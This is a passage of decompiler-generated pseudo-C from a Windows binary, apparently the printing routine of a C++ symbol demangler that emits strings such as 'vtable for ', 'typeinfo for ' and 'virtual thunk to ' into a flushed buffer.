code_r0x004047d7;\n    case 0x404890:\n        uVar7 = *(arg3 + 2);\n        piVar24 = arg3[1];\n        if (uVar7 != 0) {\n            ppiVar10 = *(arg1 + 0x100);\n            iVar25 = 1;\n            do {\n                uVar31 = *(piVar24 + iVar25 + -1);\n                if (ppiVar10 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    ppiVar9 = NULL;\n                    ppiVar10 = 0x1;\n                }\n                else {\n                    ppiVar9 = ppiVar10;\n                    ppiVar10 = ppiVar10 + 1;\n                }\n                iVar25 = iVar25 + 1;\n                *(arg1 + 0x100) = ppiVar10;\n                arg1[ppiVar9] = uVar31;\n                arg1[0x108] = uVar31;\n            } while (iVar25 != uVar7 + 1);\n        }\n        break;\n    case 0x404910:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"hidden alias for \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404990:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"TLS wrapper function for \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404a10:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"reference temporary #\";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        pcVar19 = \" for \";\n        fcn.00407f90(arg1, arg2_00, arg3[2]);\n        iVar25 = *(arg1 + 0x100);\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404a90:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"TLS init function for \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404b10:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"guard variable for \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404b90:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"covariant return thunk to \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404c10:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"java Class for \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404c90:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"virtual thunk to \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404d10:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"non-virtual thunk to \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404d90:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"typeinfo name for \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404e10:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"typeinfo fn for \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404e90:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"typeinfo for \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x404f10:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"construction vtable for \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        pcVar19 = \"-in-\";\n        fcn.00407f90(arg1, arg2_00, arg3[1]);\n        iVar25 = *(arg1 + 0x100);\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n        break;\n    case 0x404f90:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"vtable for \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x405010:\n        iVar25 = *(arg1 + 0x100);\n        pcVar19 = \"VTT for \";\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n        break;\n    case 0x405090:\n        iVar25 = *(arg1 + 0x100);\n        if (iVar25 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar14 = 1;\n            iVar25 = 0;\n        }\n        else {\n            iVar14 = iVar25 + 1;\n        }\n        *(arg1 + 0x100) = iVar14;\n        arg1[iVar25] = 0x7e;\n        arg1[0x108] = 0x7e;\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n        break;\n    case 0x4050d0:\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n        break;\n    case 0x4050e3:\n        uVar4 = *(arg1 + 0x128);\n        *(arg1 + 0x128) = 0;\n        piVar24 = arg3[1];\n        if (piVar24 == NULL) {\ncode_r0x0040794e:\n            *(arg1 + 0x130) = 1;\n        }\n        else {\n            ppiVar10 = *(arg1 + 0x120);\n            uVar7 = 0;\n            ppiVar9 = &stack0xffffffffffffff38;\n            ppiVar11 = NULL;\n            do {\n                ppiVar8 = ppiVar9;\n                *ppiVar8 = ppiVar11;\n                iVar29 = *piVar24;\n                uVar7 = uVar7 + 1;\n                *(arg1 + 0x128) = ppiVar8;\n                ppiVar8[1] = piVar24;\n                *(ppiVar8 + 2) = 0;\n                ppiVar8[3] = ppiVar10;\n                if (4 < iVar29 - 0x1cU) {\n                    if (iVar29 == 4) {\n                        *(arg1 + 0x120) = &stack0xffffffffffffff28;\n                        ppiStack216 = ppiVar10;\n                        piStack208 = piVar24;\n                    }\n                    else if (iVar29 == 2) {\n                        piVar18 = *(piVar24 + 4);\n                        iVar29 = *piVar18;\n                        if (iVar29 != 0x45) goto code_r0x004051d4;\n                        while( true ) {\n                            piVar18 = *(piVar18 + 2);\n                            iVar29 = *piVar18;\ncode_r0x004051d4:\n                            if (4 < iVar29 - 0x1cU) break;\n                            if (uVar7 == 4) {\n                                *(arg1 + 0x130) = 1;\n                                return iVar29 - 0x1cU;\n                            }\n                            uVar6 = uVar7 - 1;\n                            uVar12 = uVar7;\n                            uVar7 = uVar7 + 1;\n                            iVar14 = uVar12 * 0x20;\n                            iVar25 = uVar6 * 0x20;\n                            *(&stack0xffffffffffffff38 + iVar14) = *(&stack0xffffffffffffff38 + iVar25);\n                            *(&stack0xffffffffffffff40 + iVar14) = *(&stack0xffffffffffffff40 + iVar25);\n                            *(&stack0xffffffffffffff48 + iVar14) = *(&stack0xffffffffffffff48 + iVar25);\n                            *(&stack0xffffffffffffff50 + iVar14) = *(&stack0xffffffffffffff50 + iVar25);\n                            *(&stack0xffffffffffffff38 + iVar14) = &stack0xffffffffffffff38 + uVar6 * 4 * 8;\n                            *(&stack0xffffffffffffff40 + iVar25) = piVar18;\n                            *(arg1 + 0x128) = &stack0xffffffffffffff38 + uVar12 * 4 * 8;\n                            *(&stack0xffffffffffffff48 + iVar25) = 0;\n                            *(&stack0xffffffffffffff50 + iVar25) = ppiVar10;\n                        }\n                    }\n                    ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[2]);\n                    if (*piVar24 == 4) {\n                        *(arg1 + 0x120) = ppiStack216;\n                        ppiVar9 = ppiStack216;\n                    }\n                    while (uVar7 != 0) {\n                        uVar7 = uVar7 - 1;\n                        uVar12 = uVar7;\n                        ppiVar9 = uVar12 * 0x20;\n                        if (*(&stack0xffffffffffffff48 + uVar12 * 0x20) == 0) {\n                            iVar25 = *(arg1 + 0x100);\n                            if (iVar25 == 0xff) {\n                                arg1[0xff] = 0;\n                                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                                iVar25 = 0;\n                            }\n                            arg3_00 = *(&stack0xffffffffffffff40 + uVar12 * 0x20);\n                            *(arg1 + 0x100) = iVar25 + 1;\n                            arg1[iVar25] = 0x20;\n                            arg1[0x108] = 0x20;\n                            ppiVar9 = fcn.00407fc0(arg1, arg2_00, arg3_00);\n                        }\n                    }\n                    *(arg1 + 0x128) = uVar4;\n                    return ppiVar9;\n                }\n                piVar24 = *(piVar24 + 2);\n                ppiVar9 = ppiVar8;\n                if (piVar24 == NULL) goto code_r0x0040794e;\n                ppiVar9 = ppiVar8 + 4;\n                ppiVar11 = ppiVar8;\n            } while (uVar7 != 4);\n            *(arg1 + 0x130) = 1;\n        }\n        break;\n    case 0x405252:\n        fcn.00407f90(arg1, arg2_00, arg3[1]);\n        iVar25 = *(arg1 + 0x100);\n        if ((arg2 & 4) == 0) {\n            puVar20 = 0x42d8d4;\n            do {\n                uVar31 = *puVar20;\n                if (iVar25 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar25 = 1;\n                }\n                else {\n                    iVar14 = iVar25;\n                    iVar25 = iVar25 + 1;\n                }\n                puVar20 = puVar20 + 1;\n                *(arg1 + 0x100) = iVar25;\n                arg1[iVar14] = uVar31;\n                arg1[0x108] = uVar31;\n            } while (puVar20 != 0x42d8d6);\n        }\n        else {\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 1;\n                iVar25 = 0;\n            }\n            else {\n                iVar14 = iVar25 + 1;\n            }\n            *(arg1 + 0x100) = iVar14;\n            arg1[iVar25] = 0x2e;\n            arg1[0x108] = 0x2e;\n        }\n        piVar24 = arg3[2];\n        if (*piVar24 == 0x45) {\n            iVar25 = *(arg1 + 0x100);\n            pcVar19 = \"{default arg#\";\n            do {\n                cVar26 = *pcVar19;\n                if (iVar25 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar25 = 1;\n                }\n                else {\n                    iVar14 = iVar25;\n                    iVar25 = iVar25 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar25;\n                arg1[iVar14] = cVar26;\n                arg1[0x108] = cVar26;\n            } while (pcVar19 != \"\");\n            puVar22 = &stack0xffffffffffffff38;\n            sub.msvcrt.dll_sprintf(puVar22, 0x42d8e5, piVar24[4] + 1);\n            puVar17 = puVar22;\n            do {\n                puVar16 = puVar17;\n                uVar6 = *puVar16 + 0xfefefeff & ~*puVar16;\n                uVar7 = uVar6 & 0x80808080;\n                puVar17 = puVar16 + 1;\n            } while (uVar7 == 0);\n            bVar32 = (uVar6 & 0x8080) == 0;\n            if (bVar32) {\n                uVar7 = uVar7 >> 0x10;\n            }\n            if (bVar32) {\n                puVar17 = puVar16 + 6;\n            }\n            puVar20 = puVar17 + ((-3 - CARRY1(uVar7, uVar7)) - puVar22);\n            if (puVar20 == NULL) {\n                iVar25 = *(arg1 + 0x100);\n            }\n            else {\n                puVar17 = puVar20 + puVar22;\n                iVar14 = *(arg1 + 0x100);\n                do {\n                    uVar31 = *puVar22;\n                    if (iVar14 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        iVar25 = 1;\n                        iVar14 = 0;\n                    }\n                    else {\n                        iVar25 = iVar14 + 1;\n                    }\n                    puVar22 = puVar22 + 1;\n                    *(arg1 + 0x100) = iVar25;\n                    arg1[iVar14] = uVar31;\n                    arg1[0x108] = uVar31;\n                    iVar14 = iVar25;\n                } while (puVar22 != puVar17);\n            }\n            puVar20 = 0x42d8e9;\n            do {\n                uVar31 = *puVar20;\n                if (iVar25 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar25 = 1;\n                }\n                else {\n                    iVar14 = iVar25;\n                    iVar25 = iVar25 + 1;\n                }\n                puVar20 = puVar20 + 1;\n                *(arg1 + 0x100) = iVar25;\n                arg1[iVar14] = uVar31;\n                arg1[0x108] = uVar31;\n            } while (puVar20 != 0x42d8ec);\n            piVar24 = *(piVar24 + 2);\n        }\n        ppiVar9 = fcn.00407f90(arg1, arg2_00, piVar24);\n        break;\n    case 0x4052e0:\n        if ((arg2 & 4) == 0) {\n            uVar7 = *(arg3 + 2);\n            piVar24 = arg3[1];\n            if (uVar7 != 0) {\n                ppiVar10 = *(arg1 + 0x100);\n                iVar25 = 1;\n                do {\n                    uVar31 = *(piVar24 + iVar25 + -1);\n                    if (ppiVar10 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        ppiVar9 = NULL;\n                        ppiVar10 = 0x1;\n                    }\n                    else {\n                        ppiVar9 = ppiVar10;\n                        ppiVar10 = ppiVar10 + 1;\n                    }\n                    iVar25 = iVar25 + 1;\n                    *(arg1 + 0x100) = ppiVar10;\n                    arg1[ppiVar9] = uVar31;\n                    arg1[0x108] = uVar31;\n                } while (iVar25 != uVar7 + 1);\n            }\n        }\n        else {\n            piVar24 = arg3[1];\n            piVar18 = piVar24 + *(arg3 + 2);\n            while (piVar24 < piVar18) {\n                cVar26 = *piVar24;\n                if (((3 < piVar18 - piVar24) && (cVar26 == '_')) &&\n                   ((*(piVar24 + 1) == '_' && ((*(piVar24 + 2) == 'U' && (piVar30 = piVar24 + 3,  piVar30 < piVar18)))))\n                   ) {\n                    uVar7 = 0;\n                    do {\n                        cVar2 = *piVar30;\n                        iVar29 = cVar2;\n                        if (cVar2 - 0x30U < 10) {\n                            iVar29 = iVar29 + -0x30;\n                        }\n                        else if (cVar2 + 0xbfU < 6) {\n                            iVar29 = iVar29 + -0x37;\n                        }\n                        else {\n                            if (5 < cVar2 + 0x9fU) {\n                                cVar26 = '_';\n                                if (((piVar18 <= piVar30) || (cVar2 != '_')) || (cVar26 = cVar2,  0xff < uVar7))\n                                goto code_r0x00407200;\n                                if (*(arg1 + 0x100) == 0xff) {\n                                    arg1[0xff] = 0;\n                                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                                    *(arg1 + 0x100) = 0;\n                                }\n                                ppiVar9 = *(arg1 + 0x100);\n                                *(arg1 + 0x100) = ppiVar9 + 1;\n                                arg1[ppiVar9] = uVar7;\n                                arg1[0x108] = uVar7;\n                                goto code_r0x00407229;\n                            }\n                            iVar29 = iVar29 + -0x57;\n                        }\n                        piVar30 = piVar30 + 1;\n                        uVar7 = uVar7 * 0x10 + iVar29;\n                    } while (piVar30 != piVar18);\n                    cVar26 = '_';\n                }\ncode_r0x00407200:\n                ppiVar9 = *(arg1 + 0x100);\n                if (ppiVar9 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar25 = 1;\n                    ppiVar9 = NULL;\n                }\n                else {\n                    iVar25 = ppiVar9 + 1;\n                }\n                *(arg1 + 0x100) = iVar25;\n                arg1[ppiVar9] = cVar26;\n                arg1[0x108] = cVar26;\n                piVar30 = piVar24;\ncode_r0x00407229:\n                piVar24 = piVar30 + 1;\n            }\n        }\n        break;\n    case 0x405370:\n        pcVar19 = \" [clone \";\n        fcn.00407f90(arg1, arg2_00, arg3[1]);\n        iVar25 = *(arg1 + 0x100);\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        fcn.00407f90(arg1, arg2_00, arg3[2]);\n        ppiVar9 = *(arg1 + 0x100);\n        if (ppiVar9 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar25 = 1;\n            ppiVar9 = NULL;\n        }\n        else {\n            iVar25 = ppiVar9 + 1;\n        }\n        *(arg1 + 0x100) = iVar25;\n        arg1[ppiVar9] = 0x5d;\n        arg1[0x108] = 0x5d;\n        break;\n    case 0x4053f2:\n        pcVar19 = \"[abi:\";\n        fcn.00407f90(arg1, arg2_00, arg3[1]);\n        iVar25 = *(arg1 + 0x100);\n        do {\n            cVar26 = *pcVar19;\n            if (iVar25 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 0;\n                iVar25 = 1;\n            }\n            else {\n                iVar14 = iVar25;\n                iVar25 = iVar25 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = iVar25;\n            arg1[iVar14] = cVar26;\n            arg1[0x108] = cVar26;\n        } while (pcVar19 != \"\");\n        fcn.00407f90(arg1, arg2_00, arg3[2]);\n        ppiVar9 = *(arg1 + 0x100);\n        if (ppiVar9 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar25 = 1;\n            ppiVar9 = NULL;\n        }\n        else {\n            iVar25 = ppiVar9 + 1;\n        }\n        *(arg1 + 0x100) = iVar25;\n        arg1[ppiVar9] = 0x5d;\n        arg1[0x108] = 0x5d;\n        break;\n    case 0x405480:\n        ppiVar9 = fcn.00402080(arg1, arg3 + 1);\n        if (ppiVar9 != NULL) {\n            if (*ppiVar9 != 0x2f) {\ncode_r0x0040549e:\n                puVar3 = *(arg1 + 0x120);\n                *(arg1 + 0x120) = *puVar3;\n                ppiVar9 = fcn.00407f90(arg1, arg2_00, ppiVar9);\n                *(arg1 + 0x120) = puVar3;\n                return ppiVar9;\n            }\n            iVar29 = *(arg1 + 0x134);\n            while (0 < iVar29) {\n                ppiVar9 = ppiVar9[2];\n                iVar29 = iVar29 + -1;\n                if ((ppiVar9 == NULL) || (*ppiVar9 != 0x2f)) goto code_r0x00406f6a;\n            }\n            if ((iVar29 == 0) && (ppiVar9 = ppiVar9[1],  ppiVar9 != NULL)) goto code_r0x0040549e;\n        }\ncode_r0x00406f6a:\n        *(arg1 + 0x130) = 1;\n        break;\n    case 0x4054d0:\n        uVar4 = *(arg1 + 0x128);\n        *(arg1 + 0x128) = 0;\n        piVar24 = arg3[1];\n        if ((((arg2 & 4) == 0) || (*piVar24 != 0)) || (bVar32 = piVar24[4] == 6,  !bVar32)) {\ncode_r0x004054ff:\n            fcn.00407f90(arg1, arg2_00, piVar24);\n            if (arg1[0x108] == '<') {\n                iVar25 = *(arg1 + 0x100);\n                if (iVar25 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar25 = 0;\n                }\n                iVar14 = iVar25 + 1;\n                *(arg1 + 0x100) = iVar14;\n                arg1[iVar25] = 0x20;\n                arg1[0x108] = 0x20;\n            }\n            else {\n                iVar14 = *(arg1 + 0x100);\n            }\n            if (iVar14 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar25 = 1;\n                iVar14 = 